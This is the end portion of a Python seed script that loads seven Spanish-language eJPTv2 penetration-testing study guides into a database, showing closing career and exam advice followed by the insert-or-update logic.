   - Actualizar LinkedIn con eJPT certified
   - Compartir logro (vale para networking)

3. Si NO APROBADO:
   - No desmoralizarse (muchos reprueban 1-2 veces)
   - Revisar feedback si es disponible
   - Identificar máquinas donde te atascaste
   - Practicar específicamente esas áreas
   - Reintentar en 2-4 semanas (con descuento)
```

---

## Certificación eJPT: Valor Laboral

**¿Vale la pena?**

En España e Hispanoamérica:
- Junior penetration tester roles: Preferible eJPT
- Startups/PyMEs: Muy valorada
- Grandes empresas: Buena pero preferente CEH después
- Freelance/Bug bounty: Muy buena referencia

**Salario esperado (Junior con eJPT):**
- España: €20-28k/año junior
- Latam: $15-25k USD/año junior
- Aumenta significativamente con experiencia

**Próximos pasos post-eJPT:**
1. CEH (Certified Ethical Hacker)
2. OSCP (Offensive Security Certified Professional)
3. GPEN (GIAC Penetration Tester)

---

## Conclusión y Última Motivación

El eJPT es un examen alcanzable. La mayoría de estudiantes que dedican 4-6 semanas de estudio práctico lo aprueban.

**Recordar:**
- Pentesting es resolver problemas bajo presión
- Cada máquina es un puzzle lógico
- Lo importante es intentar → analizar → ajustar → intentar de nuevo
- No hay "one-shot" - el reconocimiento gana guerras
- Documentar es tan importante como explotar

**¡Buena suerte en tu examen eJPTv2! 🎯**
"""


def seed():
    from database import TheorySubject, TheoryPost
    db = SessionLocal()
    try:
        # Check if subject already exists
        subject = db.query(TheorySubject).filter(
            TheorySubject.slug == "ejptv2"
        ).first()

        if not subject:
            subject = TheorySubject(
                name="eJPTv2 - Junior Penetration Tester",
                slug="ejptv2",
                description="Preparación completa para la certificación eJPTv2 de eLearnSecurity: metodología pentesting, redes, sistemas, web y post-explotación. 7 guías técnicas con comandos reales y estrategias de examen.",
                icon="🎯",
                order_index=7,
            )
            db.add(subject)
            db.flush()
            print(f"\n✅  Subject creado: eJPTv2 - Junior Penetration Tester")
        else:
            print(f"\nℹ️   Subject ya existe: eJPTv2 (id={subject.id})")

        # Define guides (posts)
        guides = [
            {
                "title": "Metodología Pentesting y Preparación eJPTv2",
                "slug": "ejptv2-metodologia-pentesting",
                "content": METODOLOGIA_PENTESTING_CONTENT,
            },
            {
                "title": "Redes para Pentesters: TCP/IP, Nmap y Wireshark",
                "slug": "ejptv2-redes-fundamentales",
                "content": REDES_FUNDAMENTALES_CONTENT,
            },
            {
                "title": "Enumeración y Reconocimiento: Nmap, Gobuster y Netcat",
                "slug": "ejptv2-enumeracion-reconocimiento",
                "content": ENUMERACION_RECONOCIMIENTO_CONTENT,
            },
            {
                "title": "Metasploit Framework: Explotación de Sistemas",
                "slug": "ejptv2-metasploit-explotacion",
                "content": METASPLOIT_EXPLOTACION_CONTENT,
            },
            {
                "title": "Ataques a Aplicaciones Web: SQLi, XSS y más",
                "slug": "ejptv2-ataques-web",
                "content": ATAQUES_WEB_CONTENT,
            },
            {
                "title": "Post-Explotación: Meterpreter, Pivoting y Persistencia",
                "slug": "ejptv2-post-explotacion-pivoting",
                "content": POST_EXPLOTACION_CONTENT,
            },
            {
                "title": "Informe de Pentesting Profesional y Preparación al Examen",
                "slug": "ejptv2-informe-pentesting",
                "content": REPORTE_EXAMEN_CONTENT,
            },
        ]

        total_created = 0
        total_skipped = 0

        for guide in guides:
            post_slug = guide["slug"]

            existing = db.query(TheoryPost).filter(
                TheoryPost.slug == post_slug
            ).first()

            if existing:
                existing.markdown_content = guide["content"]
                existing.updated_at = datetime.utcnow()
                total_skipped += 1
                print(f"    ↻  Actualizado: {guide['title'][:60]}")
            else:
                post = TheoryPost(
                    subject_id=subject.id,
                    title=guide["title"],
                    slug=post_slug,
                    markdown_content=guide["content"],
                )
                db.add(post)
                total_created += 1
                print(f"    +  Creado: {guide['title'][:60]}")

        db.commit()

        print(f"""
╔══════════════════════════════════════════════════════╗
║    SEED eJPTv2 COMPLETADO CORRECTAMENTE              ║
╠══════════════════════════════════════════════════════╣
║  Subject: eJPTv2 - Junior Penetration Tester        ║
║  Posts creados     : {total_created:<4}                            ║
║  Posts actualizados: {total_skipped:<4}                            ║
║  TOTAL posts       : {total_created + total_skipped:<4}                            ║
╚══════════════════════════════════════════════════════╝
""")

    except Exception as e:
        db.rollback()
        print(f"\n❌  Error durante la inserción: {e}\n")
        import traceback
        traceback.print_exc()
        raise
    finally:
        db.close()


if __name__ == "__main__":
    print("\n🔧  Iniciando seed de guías eJPTv2...\n")
    seed()
